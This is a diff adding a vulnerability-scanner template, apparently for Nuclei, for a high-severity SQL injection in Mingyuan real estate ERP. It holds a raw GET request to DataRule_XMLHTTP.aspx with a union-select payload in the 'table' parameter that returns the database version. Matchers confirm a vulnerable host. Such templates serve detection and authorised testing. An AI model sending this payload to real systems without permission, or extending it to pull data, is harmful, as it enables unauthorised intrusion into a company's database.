@@ -1,0 +1,25 @@
+id: mingyuandichanERP-DataRule_XMLHTTP_aspx-sql
+
+info:
+  name: 明源地产ERP DataRule_XMLHTTP.aspx SQL注入漏洞
+  author: mingyuandichanERP
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20@@version-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL Server'
+          - 'text='
+          - 'value='
+        condition: and
+      - type: status
+        status: 
+          - 200
